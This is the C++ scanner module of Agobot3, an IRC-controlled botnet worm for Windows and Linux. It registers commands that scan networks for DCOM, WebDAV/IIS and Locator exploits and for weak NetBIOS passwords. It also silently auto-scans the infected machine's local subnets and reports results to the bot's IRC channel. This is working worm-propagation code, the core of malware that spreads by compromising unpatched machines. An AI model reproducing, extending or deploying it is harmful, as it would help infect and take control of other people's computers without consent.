/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "scanner.h"
#include "mainctrl.h"
#include "nbscanner.h"
#include "dcomscanner.h"
#include "dcom2scanner.h"
#include "locscanner.h"
#include "wdscanner.h"

void CScannerAuto::Init()
{
#ifndef _DEBUG
	if(g_cMainCtrl.m_cBot.scan_auto.bValue)
	{	char szLocalIp[32]={0}; char szName[255]={0}; unsigned long lLocalIp;
		CMessage mFakeMsg; int i=0; hostent *hEnt;

		gethostname(szName, sizeof(szName)); hEnt=gethostbyname(szName);
		memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);
		strcpy(szLocalIp, inet_ntoa(to_in_addr(lLocalIp)));

		mFakeMsg.bNotice=false; mFakeMsg.bSilent=true;
		mFakeMsg.sChatString.Format(".scan.dcom %s/24 1000000", szLocalIp);
		mFakeMsg.sCmd.Assign("scan.dcom");
		mFakeMsg.sDest.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
		mFakeMsg.sHost.Assign("AutoScanner.Net");
		mFakeMsg.sIdentd.Assign("AutoScanner");
		mFakeMsg.sReplyTo.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
		mFakeMsg.sSrc.Assign("AutoScanner");
		
		for(i=0;i<15;i++) g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg);
		mFakeMsg.sChatString.Format(".scan.dcom %s/16 10000000", szLocalIp);
		for(i=0;i<25;i++) g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg); }

#ifdef WIN32
	if(g_cMainCtrl.m_cBot.scan_auto_nb.bValue)
	{	char szLocalIp[32]={0}; char szName[255]={0}; unsigned long lLocalIp;
		CMessage mFakeMsg; int i=0; hostent *hEnt;

		gethostname(szName, sizeof(szName)); hEnt=gethostbyname(szName);
		memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);
		strcpy(szLocalIp, inet_ntoa(to_in_addr(lLocalIp)));

		mFakeMsg.bNotice=false; mFakeMsg.bSilent=true;
		mFakeMsg.sChatString.Format(".scan.netbios %s/24 1000000", szLocalIp);
		mFakeMsg.sCmd.Assign("scan.dcom");
		mFakeMsg.sDest.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
		mFakeMsg.sHost.Assign("AutoScanner.Net");
		mFakeMsg.sIdentd.Assign("AutoScanner");
		mFakeMsg.sReplyTo.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
		mFakeMsg.sSrc.Assign("AutoScanner");
		
		for(i=0;i<15;i++) g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg);
		mFakeMsg.sChatString.Format(".scan.netbios %s/16 10000000", szLocalIp);
		for(i=0;i<25;i++) g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg); }
#endif // WIN32
#else
//#define SCANTEST
#ifdef SCANTEST
	CMessage mFakeMsg;

	mFakeMsg.bNotice=false; mFakeMsg.bSilent=true;
	mFakeMsg.sChatString.Format(".scan.dcom2 90.0.1.55/32 100");
	mFakeMsg.sCmd.Assign("scan.dcom2");
	mFakeMsg.sDest.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
	mFakeMsg.sHost.Assign("DebugScanner.Net");
	mFakeMsg.sIdentd.Assign("DebugScanner");
	mFakeMsg.sReplyTo.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
	mFakeMsg.sSrc.Assign("DebugScanner");
	
	g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg);
#endif // SCANTEST
#endif // _DEBUG
}

void CScanner::Init()
{	m_iNumThreads=0; m_bScanning=false;
#ifdef WIN32
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdNetBios,	"scan.netbios",	"scans weak netbios passwords",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLocator,	"scan.locator",	"scans for locator exploit",	this);
#endif // WIN32
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDCOM,		"scan.dcom",	"scans for dcom exploit",		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDCOM2,	"scan.dcom2",	"scans for dcom2 exploit",		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdWebDav,	"scan.webdav",	"scans for iis/webdav exploit",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStop,		"scan.stop",	"stops all scans running asap",	this); }

bool CScanner::HandleCommand(CMessage *pMsg)
{	CString sRange(pMsg->sChatString.Token(1, " ")); int iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());

#ifdef WIN32
	if(!pMsg->sCmd.Compare("scan.netbios"))
	{	
		CScannerNetBios *pTemp=new CScannerNetBios; m_bScanning=true;
		pTemp->m_pScanner=this; pTemp->m_sRange.Assign(sRange);
		pTemp->m_iTime=iTime; pTemp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }
#endif // WIN32

	if(!pMsg->sCmd.Compare("scan.dcom"))
	{	CScannerDCOM *pTemp=new CScannerDCOM; m_bScanning=true;
		pTemp->m_pScanner=this; pTemp->m_sRange.Assign(sRange);
		pTemp->m_iTime=iTime; pTemp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("scan.dcom2"))
	{	CScannerDCOM2 *pTemp=new CScannerDCOM2; m_bScanning=true;
		pTemp->m_pScanner=this; pTemp->m_sRange.Assign(sRange);
		pTemp->m_iTime=iTime; pTemp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("scan.locator"))
	{	CScannerLocator *pTemp=new CScannerLocator; m_bScanning=true;
		pTemp->m_pScanner=this; pTemp->m_sRange.Assign(sRange);
		pTemp->m_iTime=iTime; pTemp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("scan.webdav"))
	{	CScannerWebDav *pTemp=new CScannerWebDav; m_bScanning=true;
		pTemp->m_pScanner=this; pTemp->m_sRange.Assign(sRange);
		pTemp->m_iTime=iTime; pTemp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("scan.stop")) m_bScanning=false;

	return true; }

void *CScannerBase::Run()
{	if(!(g_cMainCtrl.m_cBot.scan_maxthreads.iValue<m_pScanner->m_iNumThreads))
	{	m_pScanner->m_iNumThreads++;
 
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning subnet %s for %d seconds.", m_sScannerName.CStr(), m_sRange.CStr(), m_iTime);

		int addr[10]; CString sTokens[10]; char *szIpBuf=(char*)malloc(20);
		unsigned long lTime=(unsigned long)m_iTime*1000; unsigned long lStart;
		CString sHost, sNetMask;

		sHost=m_sRange.Token(0, "/"); sNetMask=m_sRange.Token(1, "/");

		addr[1]=atoi(sHost.Token(0, ".").CStr()); addr[2]=atoi(sHost.Token(1, ".").CStr());
		addr[3]=atoi(sHost.Token(2, ".").CStr()); addr[4]=atoi(sHost.Token(3, ".").CStr());
		addr[5]=atoi(sNetMask.CStr());
			
		srand(GetTickCount()); lStart=GetTickCount();
		
		while(((GetTickCount()-lStart)<=lTime) && m_pScanner->m_bScanning)
		{	sprintf(szIpBuf, "%d.", addr[1]); int u;
			for(u=2; u<(addr[5]/8)+1; u++) { if(u<4) sprintf(szIpBuf, "%s%d.", szIpBuf, addr[u]); else sprintf(szIpBuf, "%s%d", szIpBuf, addr[u]); }
			for(int k=u; k<5; k++) { if(k<4) sprintf(szIpBuf, "%s%d.", szIpBuf, rand()%255); else sprintf(szIpBuf, "%s%d", szIpBuf, rand()%255); }

			if(TestHost(CString(szIpBuf))) StartScan(CString(szIpBuf)); }

		free(szIpBuf);

		if(m_pScanner->m_bScanning)
			g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scan of %s finished in %d seconds.", m_sScannerName.CStr(), m_sRange.CStr(), (GetTickCount()-lStart)/1000);

		m_pScanner->m_iNumThreads--; }
	
	g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
